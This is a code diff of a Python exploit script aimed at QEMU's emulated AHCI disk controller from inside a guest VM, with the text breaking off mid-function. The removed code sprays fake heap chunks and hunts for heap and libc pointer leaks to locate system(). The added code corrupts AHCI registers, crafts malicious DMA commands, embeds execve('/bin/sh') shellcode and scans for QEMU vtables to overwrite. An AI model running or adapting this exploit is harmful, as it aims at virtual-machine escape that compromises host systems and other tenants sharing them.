@@ -428,921 +428,447 @@ class GuestMemory:
 # MAIN EXPLOIT CLASS
 # ============================================================================
 
-class AHCIExploit:
-    """Fully dynamic exploit using kvm_prober"""
+class DirectAHCIExploit:
+    """Direct AHCI MMIO exploit using kvm_prober - NO SPRAYING NEEDED"""
 
-    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober", chunk_size=None, spray_count=None, retry_count=None):
-        self.ahci = AHCIDevice(kvm_prober_path)
-        self.guest_mem = GuestMemory(kvm_prober_path)
-        self.fake_chunks = []
-        self.leaked = {}
+    def __init__(self, kvm_prober_path="/root/kvm_probin/prober/kvm_prober"):
+        self.kvm_prober = KVMProberMemory(kvm_prober_path)
+        self.ahci_base = 0xfea0e000
         self.debug = False
-
-        # Override defaults if specified
-        self.chunk_size = chunk_size or FAKE_CHUNK_SIZE
-        self.spray_count = spray_count or SPRAY_COUNT
-        self.retry_count = retry_count or RETRY_COUNT
-
-        log_info(f"Using kvm_prober at: {kvm_prober_path}")
-
+        
     def set_debug(self, debug: bool):
         self.debug = debug
-        self.ahci.set_debug(debug)
-        self.guest_mem.set_debug(debug)
-
-    def setup(self) -> bool:
-        log_info("Setting up exploit environment...")
-
-        # Test basic kvm_prober functionality
-        log_info("Testing kvm_prober...")
-        test_addr = 0x13e8000
-        
-        if not self.guest_mem.phys_mem.test_write_read(test_addr):
-            log_error("Basic kvm_prober test failed!")
-            return False
-
-        # Find and map AHCI
-        if not self.ahci.find_device():
-            log_error("No AHCI device found")
-            return False
-
-        if not self.ahci.map_mmio():
-            log_error("Failed to access AHCI MMIO via kvm_prober")
-            return False
-
-        # Initialize guest memory
-        if not self.guest_mem.init():
-            log_error("Failed to initialize guest memory")
-            return False
-
-        log_success("Setup complete")
-        return True
-
-    def create_fake_chunk(self, addr: int) -> bool:
-        """Create a fake heap chunk for spraying"""
-        if self.debug:
-            log_debug(f"Creating fake chunk at 0x{addr:x}")
-        
-        # Write chunk metadata (glibc malloc chunk header)
-        # prev_size (8 bytes) at offset 0
-        if not self.guest_mem.write_qword(addr + 0x0, 0):
-            if self.debug:
-                log_error(f"Failed to write prev_size at 0x{addr:x}")
-            return False
-        
-        # size (8 bytes) at offset 8, with PREV_INUSE flag (bit 0 = 1)
-        chunk_size_with_flag = self.chunk_size | 0x1
-        if not self.guest_mem.write_qword(addr + 0x8, chunk_size_with_flag):
-            if self.debug:
-                log_error(f"Failed to write size at 0x{addr+0x8:x}")
-            return False
-        
-        # FD and BK pointers in user data area
-        if not self.guest_mem.write_qword(addr + 0x10, 0x4141414141414141):  # FD
-            if self.debug:
-                log_error(f"Failed to write FD at 0x{addr+0x10:x}")
-            return False
-        
-        if not self.guest_mem.write_qword(addr + 0x18, 0x4343434343434343):  # BK
-            if self.debug:
-                log_error(f"Failed to write BK at 0x{addr+0x18:x}")
-            return False
-        
-        # Fill the rest of the chunk with pattern
-        # Chunk total size: self.chunk_size
-        # Header: 16 bytes (prev_size + size)
-        # Data written so far: 16 bytes (FD + BK)
-        # Remaining: self.chunk_size - 32 bytes
-        
-        remaining = self.chunk_size - 32
-        if remaining > 0:
-            # Write in smaller chunks to avoid huge hex strings
-            chunk_size_write = 0x100  # 256 bytes per write
-            pattern_qword = struct.pack('<Q', 0x4242424242424242)
-            
-            for offset in range(0, remaining, chunk_size_write):
-                write_size = min(chunk_size_write, remaining - offset)
-                # Calculate how many full qwords we need
-                qwords = write_size // 8
-                extra = write_size % 8
-                
-                # Build pattern data
-                pattern_data = pattern_qword * qwords
-                if extra > 0:
-                    pattern_data += pattern_qword[:extra]
-                
-                write_addr = addr + 0x20 + offset
-                if not self.guest_mem.write(write_addr, pattern_data):
-                    if self.debug:
-                        log_warning(f"Failed to write pattern at 0x{write_addr:x}")
-                    # Continue anyway - partial success is OK
-        
-        if self.debug:
-            log_debug(f"Created fake chunk at 0x{addr:x}")
-        
-        return True
-
-    def spray_heap(self) -> List[int]:
-        log_info(f"Spraying {self.spray_count} fake chunks (size: 0x{self.chunk_size:x})...")
-        
-        chunks = []
-        successful = 0
-        failed = 0
-        
-        for i in range(self.spray_count):
-            addr = self.guest_mem.alloc(self.chunk_size)
-            if not addr:
-                log_warning(f"Failed to allocate chunk {i}, stopping")
-                break
-            
-            if self.create_fake_chunk(addr):
-                chunks.append(addr)
-                successful += 1
-                if self.debug and successful % 100 == 0:
-                    log_debug(f"Created {successful} chunks so far...")
-            else:
-                failed += 1
-                if self.debug:
-                    log_warning(f"Failed to create chunk at 0x{addr:x}")
-            
-            # Progress update
-            if (i + 1) % 100 == 0:
-                log_info(f"  Progress: {i+1}/{self.spray_count} (ok: {successful}, failed: {failed})")
-        
-        self.fake_chunks = chunks
-        log_info(f"Spray complete: {successful} successful, {failed} failed")
-        
-        if successful > 0:
-            log_success(f"Successfully sprayed {successful} chunks")
-            return chunks
-        else:
-            log_error("Failed to spray any chunks")
-            return []
-
-    def create_trigger_command(self) -> bytes:
-        """Create a command to trigger the vulnerability"""
-        cmd = bytearray(32)
-        struct.pack_into('<I', cmd, 0, 0x0005)  # Command FIS length
-        struct.pack_into('<I', cmd, 4, 0)  # PRDTL
-
-        # Command Table Base Address (CTBA)
-        ctba = self.guest_mem.alloc(256)
-        if ctba:
-            struct.pack_into('<Q', cmd, 8, ctba)
-
-        # Fill CTBA with data to trigger the bug
-        if ctba:
-            ctba_data = b'\x00' * 256
-            self.guest_mem.write(ctba, ctba_data)
-
-        return bytes(cmd)
-
-    def trigger_vulnerability(self) -> bool:
-        log_info("Triggering vulnerability...")
-
-        # Allocate command list
-        cmd_list_addr = self.guest_mem.alloc(1024)
-        if not cmd_list_addr:
-            log_error("Failed to allocate command list")
-            return False
-
-        # Create and write trigger command
-        trigger_cmd = self.create_trigger_command()
-        self.guest_mem.write(cmd_list_addr, trigger_cmd)
-
-        # Reset port
-        self.ahci.reset_port(0)
-        time.sleep(0.1)
-
-        # Configure port
-        PORT0_BASE = 0x100
-
-        # Set command list base address
-        self.ahci.write_reg(PORT0_BASE + 0x00, cmd_list_addr & 0xFFFFFFFF)
-        self.ahci.write_reg(PORT0_BASE + 0x04, (cmd_list_addr >> 32) & 0xFFFFFFFF)
-
-        # Enable command processing
-        cmd_reg = self.ahci.read_reg(PORT0_BASE + 0x18)
-        log_debug(f"Initial command register: 0x{cmd_reg:x}")
-        
-        if cmd_reg == 0:
-            log_error("Cannot read command register - device may not be ready")
-            return False
-
-        # Set FRE (Command FIS Receive Enable) and other necessary bits
-        self.ahci.write_reg(PORT0_BASE + 0x18, cmd_reg | 0x10)  # Set FRE
-
-        # Issue command
-        log_debug("Issuing command...")
-        self.ahci.write_reg(PORT0_BASE + 0x38, 0x1)  # Set Command Issue
-
-        # Wait for completion
-        time.sleep(0.3)
-
-        # Check interrupt status
-        is_reg = self.ahci.read_reg(PORT0_BASE + 0x10)
-        log_debug(f"Interrupt status: 0x{is_reg:x}")
-
-        # Clear interrupts
-        if is_reg != 0:
-            self.ahci.write_reg(PORT0_BASE + 0x10, is_reg)
-
-        log_success("Vulnerability triggered!")
-        return True
-
-    def scan_for_leak(self) -> Optional[int]:
-        log_info(f"Scanning {len(self.fake_chunks)} chunks for heap leak...")
-
-        found_leaks = []
-
-        for i, chunk_addr in enumerate(self.fake_chunks):
-            # Check FD pointer (offset 0x10 in chunk data)
-            fd = self.guest_mem.read_qword(chunk_addr + 0x10)
-            bk = self.guest_mem.read_qword(chunk_addr + 0x18)
-
-            # Check if these look like pointers (not our pattern)
-            if fd != 0x4141414141414141:
-                # Check if this looks like a heap pointer (QEMU heap is in high memory)
-                if 0x550000000000 < fd < 0x560000000000:
-                    log_success(f"Found QEMU heap leak at chunk {i}!")
-                    log_success(f"  Heap address: 0x{fd:016x}")
-                    self.leaked['heap'] = fd
-                    found_leaks.append(fd)
-
-                # Check for libc-like pointers
-                elif 0x7f0000000000 < fd < 0x7fffffffffff:
-                    log_success(f"Found possible libc pointer: 0x{fd:016x}")
-                    self.leaked['libc_ptr'] = fd
-
-            if bk != 0x4343434343434343:
-                if 0x550000000000 < bk < 0x560000000000:
-                    log_success(f"Found QEMU heap leak in BK at chunk {i}!")
-                    log_success(f"  Heap address: 0x{bk:016x}")
-                    self.leaked['heap'] = bk
-                    found_leaks.append(bk)
-
-            if (i + 1) % 200 == 0:
-                log_info(f"  Scanned {i+1}/{len(self.fake_chunks)}")
-
-        if found_leaks:
-            return found_leaks[0]
-
-        log_error("No heap leaks found")
-        log_info("Try increasing spray count or adjusting chunk size")
-        return None
-
-    def hijack_control(self) -> bool:
-        """Attempt to hijack control flow using leaked pointers"""
-        log_info("Attempting to hijack control flow...")
-
-        # Check what we've leaked
-        if not self.leaked:
-            log_error("No leaks found - cannot hijack control flow")
-            return False
-
-        log_info(f"Leaks found: {list(self.leaked.keys())}")
-
-        # Strategy 1: If we have QEMU heap pointer, try to find function pointers
-        if 'heap' in self.leaked:
-            heap_addr = self.leaked['heap']
-            log_success(f"Found QEMU heap pointer: 0x{heap_addr:016x}")
-            
-            # Calculate QEMU base (aligned to page)
-            qemu_base = heap_addr & 0xffffffffff000000
-            log_info(f"Estimated QEMU base: 0x{qemu_base:016x}")
-            
-            # Common QEMU data structures we might be able to target
-            # These offsets are estimates and may need adjustment
-            
-            # 1. Try to find timer list (common hijack target)
-            # Timers often have callback function pointers we can overwrite
-            timer_struct_size = 0x48  # Approximate size of QEMUTimer struct
-            timer_cb_offset = 0x28    # Offset to callback function in QEMUTimer
-            
-            # 2. Try to find BH (Bottom Half) list
-            # BH callbacks are another common target
-            bh_struct_size = 0x20     # Approximate size of QEMUBH
-            bh_cb_offset = 0x10       # Offset to callback function in QEMUBH
-            
-            # 3. Try to find AIO (Async I/O) handlers
-            aio_handler_size = 0x30   # Approximate size
-            aio_cb_offset = 0x18      # Offset to callback
-            
-            log_info("Potential hijack targets in QEMU:")
-            log_info(f"  - Timer callbacks (offset ~0x{timer_cb_offset:x})")
-            log_info(f"  - BH callbacks (offset ~0x{bh_cb_offset:x})")
-            log_info(f"  - AIO callbacks (offset ~0x{aio_cb_offset:x})")
-            
-            # We need to find where our fake chunk landed and what it overwrote
-            # For now, just report what we found
-            return True
-        
-        # Strategy 2: If we have libc pointer, calculate system()
-        elif 'libc_ptr' in self.leaked:
-            libc_ptr = self.leaked['libc_ptr']
-            log_success(f"Found libc pointer: 0x{libc_ptr:016x}")
-            
-            # Calculate libc base (aligned to page)
-            libc_base = libc_ptr & 0xffffffffff000000
-            self.leaked['libc_base'] = libc_base
-            log_info(f"Estimated libc base: 0x{libc_base:016x}")
-            
-            # Try to find system() address
-            # Common offsets for system() in libc (may need adjustment)
-            common_system_offsets = [
-                0x4c490,    # Ubuntu 20.04
-                0x52290,    # Ubuntu 22.04
-                0x50d60,    # Debian 11
-                0x55410,    # CentOS 8
-                0x4f420,    # Fedora 34
-            ]
-            
-            # Also check for other useful functions
-            useful_functions = {
-                'system': 'Execute shell command',
-                'execve': 'Execute program',
-                'popen': 'Execute and pipe output',
-                'dlopen': 'Load shared library',
-                'mprotect': 'Change memory protection',
-            }
-            
-            log_info("Potential libc functions to target:")
-            for offset in common_system_offsets:
-                system_addr = libc_base + offset
-                log_info(f"  - system() @ ~0x{system_addr:016x} (offset 0x{offset:x})")
-                self.leaked['system_candidate'] = system_addr
-            
-            # Check if we can find GOT/PLT entries to overwrite
-            log_info("Strategy: Overwrite function pointer in QEMU's GOT/PLT")
-            log_info("Common targets: free(), malloc(), timer callbacks")
-            
-            return True
-        
-        # Strategy 3: If we have both, we can build a more sophisticated attack
-        elif 'heap' in self.leaked and 'libc_ptr' in self.leaked:
-            log_success("Have both QEMU heap and libc pointers!")
-            
-            # We can potentially:
-            # 1. Calculate exact libc base from leaked pointer
-            # 2. Find system() or other useful functions
-            # 3. Overwrite a function pointer in QEMU heap
-            # 4. Trigger the overwritten function
-            
-            libc_ptr = self.leaked['libc_ptr']
-            libc_base = libc_ptr & 0xffffffffff000000
-            
-            # Try to get more precise by looking at the pointer value
-            # Common libc function pointers often point into the middle of functions
-            # We can try to identify which function by looking at the lower bits
-            
-            ptr_low_bits = libc_ptr & 0xFFF
-            log_info(f"Pointer lower 12 bits: 0x{ptr_low_bits:x}")
-            
-            # Common function offsets (last 12 bits)
-            common_func_patterns = {
-                0x490: "system (common)",
-                0x290: "execve (common)",
-                0x420: "popen (common)",
-                0x8e0: "malloc (common)",
-                0x4e0: "free (common)",
-            }
-            
-            for pattern, desc in common_func_patterns.items():
-                if abs(ptr_low_bits - pattern) < 0x100:  # Within 256 bytes
-                    log_info(f"Pointer might be {desc} (pattern 0x{pattern:x})")
-                    adjusted_base = libc_ptr - pattern
-                    log_info(f"Adjusted libc base: 0x{adjusted_base:016x}")
-                    self.leaked['libc_base_adjusted'] = adjusted_base
-            
-            # Build potential ROP chain or overwrite strategy
-            log_info("Potential exploitation strategies:")
-            log_info("  1. Overwrite timer callback -> system()")
-            log_info("  2. Overwrite BH callback -> system()")
-            log_info("  3. Overwrite GOT entry -> system()")
-            log_info("  4. Create fake vtable -> system()")
-            
-            return True
-        
-        # Strategy 4: Try to use other leaked pointers
-        else:
-            log_info("Analyzing other leaked pointers...")
-            for key, value in self.leaked.items():
-                if key not in ['heap', 'libc_ptr', 'libc_base']:
-                    log_info(f"  {key}: 0x{value:016x}")
-                    
-                    # Try to identify what kind of pointer this is
-                    if 0x550000000000 < value < 0x560000000000:
-                        log_info(f"    - Looks like QEMU heap pointer")
-                        # Could be a vtable pointer or other QEMU structure
-                    elif 0x7f0000000000 < value < 0x7fffffffffff:
-                        log_info(f"    - Looks like libc/stack pointer")
-                        # Could be return address or libc function pointer
-                    elif 0xffff800000000000 < value < 0xffffffffffffffff:
-                        log_info(f"    - Looks like kernel pointer")
-                        # Might be useful for different exploits
-                    else:
-                        log_info(f"    - Unknown pointer type")
-        
-        # If we got here but have leaks, we can still attempt exploitation
-        if self.leaked:
-            log_warning("Have leaks but need manual analysis for hijack")
-            log_info("Next steps:")
-            log_info("  1. Examine the leaked addresses with kvm_prober")
-            log_info("  2. Look for function pointers near those addresses")
-            log_info("  3. Try to identify what was overwritten")
-            log_info("  4. Craft appropriate payload based on findings")
-            return True
-        
-        log_warning("Could not find reliable hijack target")
-        return False
-
-    def analyze_leaks(self) -> Dict[str, any]:
-        """Analyze leaked pointers to understand memory layout"""
-        log_info("Analyzing memory leaks...")
-        
-        analysis = {
-            'qemu_base': None,
-            'libc_base': None,
-            'potential_targets': [],
-            'confidence': 'low'
-        }
-        
-        if 'heap' in self.leaked:
-            heap_addr = self.leaked['heap']
-            qemu_base = heap_addr & 0xffffffffff000000
-            analysis['qemu_base'] = qemu_base
-            
-            # Try to read memory around the leak to understand structure
-            log_info(f"Reading memory around leak 0x{heap_addr:016x}...")
-            
-            # Read a few bytes before and after
-            read_size = 0x100
-            read_addr = heap_addr - 0x80
-            data = self.guest_mem.read(read_addr, read_size)
-            
-            if data:
-                # Look for patterns that might indicate structure type
-                # Common patterns in QEMU structures
-                patterns = {
-                    b'\x00' * 8: "Zero padding / alignment",
-                    b'\xff' * 8: "Sentinel value",
-                    struct.pack('<Q', 0xdeadbeef): "Debug marker",
-                }
-                
-                # Check if this looks like a heap chunk
-                # Heap chunks usually have size field at offset 8
-                if len(data) >= 0x10:
-                    size_field = struct.unpack('<Q', data[0x8:0x10])[0]
-                    if size_field & 0x1:  # PREV_INUSE flag
-                        chunk_size = size_field & ~0x1
-                        log_info(f"Looks like heap chunk of size 0x{chunk_size:x}")
-                        analysis['potential_targets'].append(f"Heap chunk @ 0x{heap_addr:x}")
-        
-        if 'libc_ptr' in self.leaked:
-            libc_ptr = self.leaked['libc_ptr']
-            libc_base = libc_ptr & 0xffffffffff000000
-            analysis['libc_base'] = libc_base
-            
-            # Common libc function patterns in last 12 bits
-            func_offsets = {
-                0x490: 'system',
-                0x290: 'execve',
-                0x420: 'popen',
-                0x8e0: 'malloc',
-                0x4e0: 'free',
-                0x2a0: 'execv',
-                0x770: 'mmap',
-            }
-            
-            ptr_low = libc_ptr & 0xFFF
-            for offset, func_name in func_offsets.items():
-                if abs(ptr_low - offset) < 0x100:
-                    log_info(f"Pointer might be near {func_name}+0x{ptr_low-offset:x}")
-                    analysis['potential_targets'].append(f"libc {func_name} @ ~0x{libc_ptr:x}")
-        
-        return analysis
-        
-    def execute_payload(self) -> bool:
-        """Attempt to execute payload by overwriting function pointers"""
-        log_info("Attempting to execute payload...")
-        
-        # Create command to execute
-        cmd_str = b"touch /tmp/ahci_exploit_success && echo 'AHCI Exploit Successful' > /tmp/exploit.log\x00"
-        cmd_addr = self.guest_mem.alloc(len(cmd_str))
-        if not cmd_addr:
-            log_warning("Failed to allocate command string")
-            return False
-        
-        self.guest_mem.write(cmd_addr, cmd_str)
-        log_info(f"Command string at 0x{cmd_addr:x}: {cmd_str.decode()}")
-        
-        # Analyze leaks to find function pointers
-        func_ptrs = self.find_function_pointers()
-        
-        if not func_ptrs:
-            log_warning("No function pointers found in leaked memory")
-            return self.fallback_exploit(cmd_addr)
-        
-        log_success(f"Found {len(func_ptrs)} potential function pointers")
-        
-        # Calculate system() address using the offsets you found
-        system_addr = self.calculate_system_address()
-        if not system_addr:
-            log_error("Cannot calculate system() address")
-            return False
-        
-        log_success(f"Calculated system() address: 0x{system_addr:016x}")
-        
-        # Try to overwrite function pointers
-        overwritten = False
-        for ptr_info in func_ptrs:
-            if self.overwrite_function_pointer(ptr_info, system_addr, cmd_addr):
-                overwritten = True
-                log_success(f"Successfully overwritten function pointer at 0x{ptr_info['address']:016x}")
-                break
-        
-        if overwritten:
-            log_success("Function pointer overwritten - attempting to trigger...")
-            # Trigger the vulnerability again to hit overwritten pointer
-            return self.trigger_vulnerability()
-        
-        log_warning("Failed to overwrite any function pointers")
-        return self.fallback_exploit(cmd_addr)
+        self.kvm_prober.set_debug(debug)
     
-    def find_function_pointers(self) -> List[Dict]:
-        """Find function pointers in leaked memory areas"""
-        log_info("Searching for function pointers in leaked memory...")
+    def setup(self) -> bool:
+        log_info("Setting up direct AHCI exploit...")
         
-        func_ptrs = []
+        if not self.kvm_prober.is_available:
+            log_error("kvm_prober not available")
+            return False
         
-        # Scan our fake chunks for pointers that look like code
-        for i, chunk_addr in enumerate(self.fake_chunks[:50]):  # Limit to first 50 for speed
-            # Read the chunk data
-            data = self.guest_mem.read(chunk_addr, min(0x100, self.chunk_size))
+        # Test access to AHCI MMIO
+        log_info(f"Testing AHCI MMIO access @ 0x{self.ahci_base:x}")
+        test_data = self.kvm_prober.read(self.ahci_base, 16)
+        
+        if test_data:
+            log_success(f"AHCI MMIO accessible: {test_data.hex()[:32]}...")
+            return True
+        else:
+            log_error("Cannot access AHCI MMIO")
+            return False
+    
+    def write_mmio(self, offset: int, value: int) -> bool:
+        """Write 32-bit value to MMIO register"""
+        addr = self.ahci_base + offset
+        data = struct.pack('<I', value)
+        return self.kvm_prober.write(addr, data)
+    
+    def read_mmio(self, offset: int) -> Optional[int]:
+        """Read 32-bit value from MMIO register"""
+        addr = self.ahci_base + offset
+        data = self.kvm_prober.read(addr, 4)
+        if data and len(data) == 4:
+            return struct.unpack('<I', data)[0]
+        return None
+    
+    def corrupt_ahci_state(self):
+        """Direct corruption of AHCI state via MMIO"""
+        log_info("Direct AHCI state corruption attack")
+        
+        # AHCI Register Map (offsets from base):
+        # 0x00-0x2F: Global Host Control
+        # 0x100-0x17F: Port 0 Registers
+        # 0x180-0x1FF: Port 1 Registers, etc.
+        
+        # Critical registers to corrupt:
+        
+        # 1. Command List Base Address (CLB) - Port 0
+        # Make it point to controlled memory
+        controlled_addr = 0x1337000  # Address we can write to
+        log_info(f"Setting CLB to controlled address 0x{controlled_addr:x}")
+        self.write_mmio(0x100, controlled_addr & 0xFFFFFFFF)      # CLB low
+        self.write_mmio(0x104, (controlled_addr >> 32) & 0xFFFFFFFF)  # CLB high
+        
+        # 2. FIS Base Address (FB) - Port 0
+        # Also point to controlled memory
+        fis_addr = 0x1338000
+        log_info(f"Setting FIS base to 0x{fis_addr:x}")
+        self.write_mmio(0x108, fis_addr & 0xFFFFFFFF)      # FB low
+        self.write_mmio(0x10C, (fis_addr >> 32) & 0xFFFFFFFF)  # FB high
+        
+        # 3. Command Register - enable weird states
+        log_info("Corrupting Command Register")
+        # Bits: ST=1 (start), FRE=1, others corrupted
+        corrupted_cmd = 0xFFFFFFFF  # All bits set
+        self.write_mmio(0x118, corrupted_cmd)
+        
+        # 4. Interrupt Status - trigger all interrupts
+        log_info("Triggering all interrupts")
+        self.write_mmio(0x110, 0xFFFFFFFF)
+        
+        # 5. SATA Status - corrupt device state
+        log_info("Corrupting SATA Status")
+        self.write_mmio(0x128, 0xDEADBEEF)
+        
+        # 6. Command Issue - trigger command with corrupted state
+        log_info("Issuing corrupted command")
+        self.write_mmio(0x138, 0x1)
+        
+        log_success("AHCI state corrupted!")
+    
+    def setup_malicious_dma(self):
+        """Set up malicious DMA operation"""
+        log_info("Setting up malicious DMA operation")
+        
+        # Allocate DMA buffer in guest memory
+        dma_size = 0x1000
+        dma_buffer = self.allocate_dma_buffer(dma_size)
+        if not dma_buffer:
+            log_error("Failed to allocate DMA buffer")
+            return False
+        
+        # Craft malicious data that QEMU will interpret
+        malicious_data = self.create_malicious_dma_data(dma_size)
+        self.kvm_prober.write(dma_buffer, malicious_data)
+        
+        # Set up Command Header in controlled memory
+        cmd_header_addr = dma_buffer + 0x800
+        self.setup_command_header(cmd_header_addr, dma_buffer, dma_size)
+        
+        # Point CLB to our command header
+        self.write_mmio(0x100, cmd_header_addr & 0xFFFFFFFF)
+        self.write_mmio(0x104, (cmd_header_addr >> 32) & 0xFFFFFFFF)
+        
+        # Enable port and trigger
+        self.write_mmio(0x118, 0x11)  # ST=1, FRE=1
+        self.write_mmio(0x138, 0x1)   # Command Issue
+        
+        log_success("Malicious DMA setup complete")
+        return True
+    
+    def allocate_dma_buffer(self, size: int) -> Optional[int]:
+        """Allocate DMA buffer in guest physical memory"""
+        # Try common guest physical addresses
+        test_addresses = [
+            0x13e8000,    # Your working area
+            0x2000000,    # 32MB
+            0x4000000,    # 64MB
+            0x10000000,   # 256MB
+        ]
+        
+        for addr in test_addresses:
+            # Test write/read
+            test_data = b'TESTDATA'
+            if self.kvm_prober.write(addr, test_data):
+                read_back = self.kvm_prober.read(addr, len(test_data))
+                if read_back == test_data:
+                    log_success(f"DMA buffer at 0x{addr:x}")
+                    return addr
+        
+        log_error("Cannot find suitable DMA buffer location")
+        return None
+    
+    def create_malicious_dma_data(self, size: int) -> bytes:
+        """Create data that will corrupt QEMU when processed as disk I/O"""
+        data = bytearray(size)
+        
+        # Option 1: Fake partition table to trigger bugs in QEMU's block layer
+        # MBR with corrupted partition entries
+        data[0x1BE:0x1FE] = b'\x80' * 0x40  # All partitions active
+        
+        # Option 2: Corrupted filesystem metadata
+        # Ext4 superblock at offset 0x400
+        ext4_magic = b'\x53\xef'  # ext4 magic
+        data[0x400:0x402] = ext4_magic
+        
+        # Option 3: Direct code injection attempt
+        # Try to place shellcode that QEMU might execute
+        shellcode = self.create_qemu_shellcode()
+        if len(shellcode) < 0x100:
+            data[0:len(shellcode)] = shellcode
+        
+        # Option 4: Pointer overwrite patterns
+        # Fill with plausible QEMU addresses
+        for i in range(0x200, size, 8):
+            # Common QEMU .text addresses
+            qemu_text = 0x555555554000
+            struct.pack_into('<Q', data, i, qemu_text + (i % 0x1000))
+        
+        return bytes(data)
+    
+    def create_qemu_shellcode(self) -> bytes:
+        """Create shellcode for QEMU process (x86-64 Linux)"""
+        # execve("/bin/sh", NULL, NULL)
+        shellcode = (
+            # xor rdx, rdx
+            b'\x48\x31\xd2'
+            # mov rbx, "/bin/sh"
+            b'\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00'
+            # push rbx
+            b'\x53'
+            # mov rdi, rsp
+            b'\x48\x89\xe7'
+            # xor rax, rax
+            b'\x48\x31\xc0'
+            # push rax
+            b'\x50'
+            # push rdi
+            b'\x57'
+            # mov rsi, rsp
+            b'\x48\x89\xe6'
+            # mov al, 0x3b (execve)
+            b'\xb0\x3b'
+            # syscall
+            b'\x0f\x05'
+        )
+        return shellcode
+    
+    def setup_command_header(self, header_addr: int, dma_addr: int, dma_size: int):
+        """Set up AHCI command header for DMA"""
+        # AHCI Command Header (32 bytes)
+        header = bytearray(32)
+        
+        # Command FIS Length: 5 DWORDS (20 bytes)
+        struct.pack_into('<H', header, 0, 5)
+        
+        # ATAPI: 0 (not ATAPI), Write: 0 (read), Prefetch: 0, Reset: 0
+        # Physical Region Descriptor Table Length (PRDTL): 1 entry
+        struct.pack_into('<H', header, 2, 1)
+        
+        # PRD Byte Count
+        struct.pack_into('<I', header, 4, dma_size)
+        
+        # Command Table Base Address (CTBA)
+        ctba = dma_addr + 0x400  # Command table after header
+        struct.pack_into('<Q', header, 8, ctba)
+        
+        # Write header
+        self.kvm_prober.write(header_addr, header)
+        
+        # Setup Command Table (128 bytes)
+        cmd_table = bytearray(128)
+        
+        # Command FIS (20 bytes)
+        # H2D FIS, Command = 0x25 (READ DMA EXT)
+        cmd_fis = bytearray(20)
+        cmd_fis[0] = 0x27  # FIS Type: Host to Device
+        cmd_fis[1] = 0x80  # Command bit
+        cmd_fis[2] = 0x25  # READ DMA EXT command
+        
+        # LBA (logical block address) - any value
+        cmd_fis[4] = 0x01
+        cmd_fis[5] = 0x00
+        cmd_fis[6] = 0x00
+        cmd_fis[7] = 0x00
+        cmd_fis[8] = 0x00
+        cmd_fis[9] = 0x00
+        
+        # Sector count
+        cmd_fis[12] = 0x01  # 1 sector
+        
+        cmd_table[0:20] = cmd_fis
+        
+        # PRD (Physical Region Descriptor) - 16 bytes
+        # Data Base Address
+        struct.pack_into('<Q', cmd_table, 0x80, dma_addr)
+        # Byte Count (with interrupt flag)
+        struct.pack_into('<I', cmd_table, 0x88, dma_size | (1 << 31))
+        
+        # Write command table
+        self.kvm_prober.write(ctba, cmd_table)
+    
+    def find_qemu_structures(self):
+        """Scan memory around AHCI for QEMU data structures"""
+        log_info(f"Scanning for QEMU structures around 0x{self.ahci_base:x}")
+        
+        scan_start = self.ahci_base - 0x10000
+        scan_end = self.ahci_base + 0x10000
+        
+        found = []
+        
+        for addr in range(scan_start, scan_end, 8):
+            data = self.kvm_prober.read(addr, 8)
             if not data:
                 continue
             
-            # Look for pointers in the chunk
-            for offset in range(0, len(data) - 8, 8):
-                if offset % 8 == 0:  # QWORD aligned
-                    ptr = struct.unpack('<Q', data[offset:offset+8])[0]
+            val = struct.unpack('<Q', data)[0]
+            
+            # Look for QEMU code pointers
+            if 0x550000000000 <= val < 0x570000000000:
+                # Could be a vtable or function pointer
+                # Check nearby for more pointers (vtables have multiple)
+                context = self.kvm_prober.read(addr - 0x20, 0x40)
+                if context:
+                    # Count function pointers in context
+                    ptr_count = 0
+                    for i in range(0, len(context), 8):
+                        if i + 8 <= len(context):
+                            ctx_val = struct.unpack('<Q', context[i:i+8])[0]
+                            if 0x550000000000 <= ctx_val < 0x570000000000:
+                                ptr_count += 1
                     
-                    # Check if this looks like a code pointer
-                    if self.is_likely_function_pointer(ptr):
-                        func_ptrs.append({
-                            'chunk_index': i,
-                            'chunk_addr': chunk_addr,
-                            'offset': offset,
-                            'address': chunk_addr + offset,
-                            'value': ptr,
-                            'type': self.guess_pointer_type(ptr)
-                        })
+                    if ptr_count >= 2:  # Likely vtable
+                        log_success(f"Possible QEMU vtable @ 0x{addr:x} (context has {ptr_count} ptrs)")
+                        found.append(addr)
         
-        # Also check areas around our leaks
-        for leak_name, leak_addr in self.leaked.items():
-            if isinstance(leak_addr, int):
-                # Scan around the leak
-                scan_start = leak_addr - 0x100
-                scan_end = leak_addr + 0x100
-                
-                for addr in range(scan_start, scan_end, 8):
-                    if addr % 8 == 0:
-                        ptr = self.guest_mem.read_qword(addr)
-                        if ptr and self.is_likely_function_pointer(ptr):
-                            func_ptrs.append({
-                                'leak_source': leak_name,
-                                'leak_addr': leak_addr,
-                                'offset': addr - leak_addr,
-                                'address': addr,
-                                'value': ptr,
-                                'type': self.guess_pointer_type(ptr)
-                            })
-        
-        # Sort by likelihood
-        func_ptrs.sort(key=lambda x: self.pointer_confidence(x['value']), reverse=True)
-        
-        # Log findings
-        for i, ptr_info in enumerate(func_ptrs[:10]):  # Top 10
-            src = ptr_info.get('chunk_addr', ptr_info.get('leak_addr', 0))
-            log_info(f"  {i+1}. 0x{ptr_info['address']:016x} -> 0x{ptr_info['value']:016x} "
-                   f"[{ptr_info['type']}] (src: 0x{src:x})")
-        
-        return func_ptrs
+        return found
     
-    def is_likely_function_pointer(self, addr: int) -> bool:
-        """Check if an address looks like a function pointer"""
-        if addr == 0:
+    def attempt_control_hijack(self):
+        """Attempt to hijack control flow by overwriting QEMU function pointers"""
+        log_info("Attempting control flow hijack")
+        
+        # Find QEMU structures
+        targets = self.find_qemu_structures()
+        if not targets:
+            log_error("No QEMU structures found")
             return False
         
-        # Check if it points to executable memory regions
-        # QEMU code is typically in high memory
-        if 0x550000000000 <= addr < 0x560000000000:
-            return True
+        # Try to overwrite first found pointer
+        target_addr = targets[0]
         
-        # libc code is in high user memory
-        if 0x7f0000000000 <= addr < 0x7fffffffffff:
-            return True
+        # Read current value
+        current = self.kvm_prober.read(target_addr, 8)
+        if current:
+            current_val = struct.unpack('<Q', current)[0]
+            log_info(f"Current value at 0x{target_addr:x}: 0x{current_val:016x}")
         
-        # Kernel code (if we leak kernel pointers)
-        if 0xffff800000000000 <= addr < 0xffffffffffffffff:
-            return True
+        # Try to find QEMU's system() or similar
+        # Scan QEMU memory for useful functions
+        qemu_system_addr = self.find_qemu_system()
+        if qemu_system_addr:
